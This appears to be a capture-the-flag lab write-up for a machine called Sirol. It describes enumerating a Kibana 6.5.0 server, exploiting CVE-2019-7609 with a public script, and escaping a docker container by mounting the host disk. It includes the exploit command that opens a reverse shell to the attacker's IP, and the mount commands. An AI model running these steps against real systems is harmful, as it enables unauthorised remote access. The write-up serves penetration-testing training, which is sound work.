Sirol

Target IP: 192.168.209.54
Challenge Description: Don't get trapped with Sirol.

Performing an aggressive port scan against the open TCP ports returns the result above. By the looks of it, there are two HTTP applications: one on port 80, and another one on port 5601. The Kibana application on port 5601 sounds interesting. And I will start enumeration with this application.

Enumeration & Exploitation

Port 80: HTTP

This port contains the PHP calculator web application above.

Port 5601: Kibana HTTP

I browsed to the Management feature of this Kibana application and obtained the version number 6.5.0 as shown above. Now I have the version number, I know this application is vulnerable to RCE as it is less than 6.6.0.


The Timelion Visualizer has a vulnerability which can be leveraged to perform RCE as shown above. This vulnerability has the CVE of CVE-2019-7609. Now I have to find a working exploit.


And the Timelion Visualizer feature is enabled!


I searched for CVE-2019-7609 exploits and obtained the Github repository above. I made a copy of the exploit on my machine. Then I started a listener on my machine at port 21.


Using the command python2 exp.py -u http://192.168.209.54:5601/ -host 192.168.45.183 -port 21 --shell, I ran the exploit. Then I obtained a root reverse shell connection on my machine at port 21, as shown above. Now I have a root shell on the target machine.

Privilege Escalation & Flags


There is one user called trent on the target machine. The local.txt flag is located at this user's home directory, as shown above. However, there is no sign of proof.txt flag!


After some enumeration, I found out I landed a shell on a docker environment machine. And running fdisk -l shows the entry /dev/sda1. And using the commands mkdir /mnt/sda1 and mount /dev/sda1 /mnt/sda1 I created a directory to mount the sda1 drive. This is where I found the proof.txt flag.


The proof.txt flag is shown above.
